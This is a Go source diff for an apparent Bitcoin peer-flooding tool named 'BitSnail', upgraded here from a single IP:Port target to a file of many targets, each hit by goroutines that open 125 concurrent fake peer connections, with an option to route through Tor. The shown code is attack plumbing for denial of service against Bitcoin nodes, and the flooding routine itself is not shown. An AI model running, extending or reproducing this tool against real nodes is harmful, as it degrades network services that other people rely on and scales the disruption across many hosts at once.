@@ -24,6 +24,7 @@ package main
 
 import (
 	"fmt"
+	"io/ioutil"
 	"net"
 	_ "net/http/pprof"
 	"os"
@@ -37,7 +38,7 @@ const numberPeerFlood = 125 // DEFAULT_MAX_PEER_CONNECTIONS
 
 // The User Agent is sent in the initial handshake to the target Bitcoin peer.
 //const clientUserAgent = "/Satoshi:0.18.0/"
-const clientUserAgent = "/BitSnail:0.1.0/"
+const clientUserAgent = "/BitSnail:0.2.0/"
 
 var torEnable = false
 
@@ -49,19 +50,19 @@ const torRestart = 30      // In minutes
 var torExecutable = ""
 
 func main() {
-	// get the target from command line
-	var targetPeer *net.TCPAddr
+	// get the target from command line or input file
+	var targetPeers []net.TCPAddr
 
 	switch len(os.Args) {
 	case 2:
-		targetPeer = ParseBitcoinTarget(os.Args[1])
+		targetPeers = ParseBitcoinTarget(os.Args[1], true)
 
 	case 3:
-		targetPeer = ParseBitcoinTarget(os.Args[1])
+		targetPeers = ParseBitcoinTarget(os.Args[1], true)
 
 		torExecutable = os.Args[2]
 		if !strings.HasPrefix(torExecutable, "tor=") {
-			targetPeer = nil
+			targetPeers = nil
 			break
 		}
 		torExecutable = strings.TrimPrefix(torExecutable, "tor=")
@@ -75,7 +76,7 @@ func main() {
 	default:
 	}
 
-	if targetPeer == nil {
+	if len(targetPeers) == 0 {
 		fmt.Printf("Invalid arguments. First parameter must be IP:Port and second optional is tor=[executable].\n")
 		return
 	}
@@ -88,17 +89,34 @@ func main() {
 	}
 
 	// start!
-	fmt.Printf("Try to create %d concurrent fake peers, target is %s.\n", numberPeerFlood, targetPeer.String())
+	for _, address := range targetPeers {
+		go slowDownBitcoinPeer(address, numberPeerFlood)
+	}
 
-	go slowDownTarget(targetPeer, numberPeerFlood)
-
-	go stats(targetPeer.String())
+	go stats()
 
 	select {}
 }
 
 // ParseBitcoinTarget parses a target in the form of IP:Port. Returns nil if invalid input.
-func ParseBitcoinTarget(target string) (tcpAddr *net.TCPAddr) {
+func ParseBitcoinTarget(target string, allowFile bool) (tcpAddr []net.TCPAddr) {
+	// file?
+	if fileExists(target) {
+		dat, err := ioutil.ReadFile(target)
+		if err == nil {
+			fields := strings.Fields(string(dat))
+			for _, field := range fields {
+				field = strings.TrimSpace(field)
+				addr1 := ParseBitcoinTarget(field, false)
+				if len(addr1) > 0 {
+					tcpAddr = append(tcpAddr, addr1...)
+				}
+			}
+			return
+		}
+	}
+
+	// otherwise must be IP:Port
 	host, port, err := net.SplitHostPort(target)
 	if err != nil {
 		return nil
@@ -113,7 +131,7 @@ func ParseBitcoinTarget(target string) (tcpAddr *net.TCPAddr) {
 		return nil
 	}
 
-	return &net.TCPAddr{IP: ip, Port: portN}
+	return []net.TCPAddr{net.TCPAddr{IP: ip, Port: portN}}
 }
 
 func fileExists(path string) bool {
